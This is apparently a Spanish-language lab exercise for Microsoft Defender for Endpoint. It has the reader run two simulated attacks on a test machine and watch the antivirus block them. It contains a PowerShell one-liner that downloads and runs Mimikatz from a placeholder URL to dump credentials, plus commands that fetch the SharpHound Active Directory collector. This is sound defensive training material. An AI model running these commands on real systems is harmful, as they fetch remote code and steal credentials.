# Módulo 2: mitigación de amenazas con Microsoft Defender para puntos de conexión

**Nota**: la finalización correcta de esta demostración depende de completar todos los pasos del [documento de requisitos previos](00-prerequisites.md).

## Ataques simulados

En esta tarea, ejecutará dos ataques simulados para explorar las funcionalidades de Microsoft Defender para punto de conexión.

1. Si aún no está en el portal de Microsoft Defender XDR en el explorador, vaya a Microsoft Defender XDR en (https://security.microsoft.com) ha iniciado sesión como administrador para el inquilino.

Ejecutará los ataques *simulados* mediante *PowerShell* en *WIN1* para explorar las funcionalidades de Microsoft Defender para punto de conexión.

`Attack 1: Mimikatz - Credential Dumping`

1. En la máquina *WIN1*, escriba **Comando** en la barra de búsqueda y seleccione **Ejecutar como administrador**.

1. Copie y pegue el siguiente comando en el **Administrador: Ventana del símbolo del sistema** y presione **Entrar** para ejecutarlo.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. Debería ver un mensaje indicando *Acceso denegado* y un mensaje emergente de `Microsoft Defender Antivirus, Windows Security Virus and threats protection` mostrando *Amenazas encontradas*.

1. Salga del **Administrador: Ventana del símbolo del sistema** escribiendo **salir** y presionando **Entrar**.

`Attack 2: Bloodhound - Collection`

1. En la máquina *WIN1*, escriba **PowerShell** en la barra de búsqueda, seleccione **Windows PowerShell** y seleccione **Ejecutar como administrador**.

1. Copie y pegue los siguientes comandos en el **Administrador: Ventana de Windows PowerShell** y presione **Entrar** para ejecutarlo.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Nota:** Se recomienda copiar, pegar y ejecutar los comandos de uno en uno. Abra *Bloc de notas* y copie los comandos en un archivo temporal para hacerlo. El primer comando crea una carpeta denominada *ExternalPayloads* en la misma carpeta donde se encuentra la carpeta *Atomic Red Team*. El segundo comando descarga el archivo *SharpHound.ps1* del repositorio de GitHub *BloodHound* y lo guarda en la carpeta *ExternalPayloads*.

1. Debería ver un mensaje emergente en `Windows Security Virus and threats protection` el que se muestran las *Amenazas encontradas*.

1. Copie y pegue el siguiente comando en el **Administrador: Ventana de Windows PowerShell** y presione **Entrar** para ejecutarlo.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. Si la salida fuera *True*, el archivo de carga de malware no se habrá quitado por el Antivirus de Microsoft Defender. Si la salida fuera *False*, el archivo de carga de malware se habrá quitado por el Antivirus de Microsoft Defender. Use la tecla de dirección hacia arriba para repetir el comando hasta que la salida sea *False*.

## Has completado la demostración
